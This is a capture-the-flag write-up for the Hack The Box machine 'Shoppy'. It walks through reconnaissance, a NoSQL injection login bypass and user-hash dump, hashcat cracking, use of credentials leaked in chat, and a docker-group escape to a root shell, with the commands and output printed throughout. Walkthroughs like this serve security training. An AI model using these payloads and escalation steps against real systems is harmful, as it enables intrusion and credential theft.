# HTB - Shoppy
## Itay Nafrin | October 12th, 2022

### IP = 10.10.11.180

### NMAP
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### GoBuster
```
$ gobuster dir -u http://shoppy.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/12 12:16:11 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 1074]              
/admin                (Status: 302) [Size: 28] [--> /login]   
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]   
/Login                (Status: 200) [Size: 1074]              
/js                   (Status: 301) [Size: 171] [--> /js/]    
/fonts                (Status: 301) [Size: 177] [--> /fonts/] 
/Admin                (Status: 302) [Size: 28] [--> /login]   
/exports              (Status: 301) [Size: 181] [--> /exports/]
/LogIn                (Status: 200) [Size: 1074]               
/LOGIN                (Status: 200) [Size: 1074]               
                                                               
===============================================================
2022/10/12 12:52:50 Finished
===============================================================
```
### Subdomain Hunting
```
$ wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt -u 'http://shoppy.htb' -H "Host: FUZZ.shoppy.htb" --hw 11
Target: http://shoppy.htb/
Total requests: 100000
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
47340:  C=200      0 L       141 W         3122 Ch        "mattermost"

Total time: 0
Processed Requests: 72307
Filtered Requests: 72306
Requests/sec.: 0
```
As you can see there is a subdomain that you can access which leads you to a login form.

### Web Enum
When you go to the login page you can see that there isn't much to do so you just try things like default credentials, sqli, LFI or NoSQLI and when you try NoSQLi you can see that it works!

### NoSQL Injection

```
Login Form
username: admin'||'1==1
password: sdasfesd
```

and it worked we're in!!!

### More Enum

As you can see there is a user searching engine so you can enter the same payload there and you'll get the id, username and password of the admin and josh. 
http://shoppy.htb/admin/search-users?username=admin%27%7C%7C%271%3D%3D1

```

0:	
id	"62db0e93d6d6a999a66ee67a"
username	"admin"
password	"23c6877d9e2b564ef8b32c3a23de27b2"
1:	
id	"62db0e93d6d6a999a66ee67b"
username	"josh"
password	"6ebcea65320589ca4f2f1ce039975995"

```

### Hash Cracking

```

(Windows)\hashcat-6.2.6>hashcat.exe -m 0 hashes\shoppy.txt rockyou.txt -O 
6ebcea65320589ca4f2f1ce039975995:remembermethisway

```

This is josh's password!!!
josh:remembermethisway

### Subdomain Enum 

http://mattermost.shoppy.htb - enter the credentials here 


here when you go the the Deploy Machine page you can see a message from jaeger and his ssh credentials.

```

jaeger
4:22 AM

Hey @josh,

For the deploy machine, you can create an account with these creds :
username: jaeger
password: Sh0ppyBest@pp!
And deploy on it
```

### SSH Login

```

$ ssh jaeger@shoppy.htb                
The authenticity of host 'shoppy.htb (10.10.11.180)' can't be established.
ED25519 key fingerprint is SHA256:RISsnnLs1eloK7XlOTr2TwStHh2R8hui07wd1iFyB+8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'shoppy.htb' (ED25519) to the list of known hosts.
jaeger@shoppy.htb's password: Sh0ppyBest@pp!
jaeger@shoppy:$ whoami && id && cat user.txt
jaeger                                                                                                 
uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger)                                                  
9ed8cdcabb97e01da19c2413fb8b1870

```

### Priv Esc
```

$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager

$ strings password-manager
more...
Welcome to Josh password manager!
Please enter your master password: 
Access granted! Here is creds !
cat /home/deploy/creds.txt
more...

```

This means that when you enter the right password it prints you deploy's credentials. Now, if you cat the program:

```
$ cat password-manager
Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported ! 

```

You can see that right behind "Access granted!" there is a word: "Sample" and it didn't show when I ran strings so maybe it is the password.

```

jaeger@shoppy:$ sudo -u 'deploy' /home/deploy/password-manager
[sudo] password for jaeger: 
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!

```

It Worked!

```

jaeger@shoppy:$ ssh deploy@10.10.11.180
deploy@10.10.11.180's password: Deploying@pp!
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ bash
deploy@shoppy:$ whoami && id
deploy
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)


```

When running id we can see that deploy is a part of the docker group and it can be exploited so we can gain a root shell through it.

```

deploy@shoppy:/dev/shm$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
/# bash 
root@936fad3dc8dc:/# cd /root
root@936fad3dc8dc:/root# whoami && id && cat root.txt
root
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
cbfc5ed2b8fa25c6068e1b6123f8cf1a

```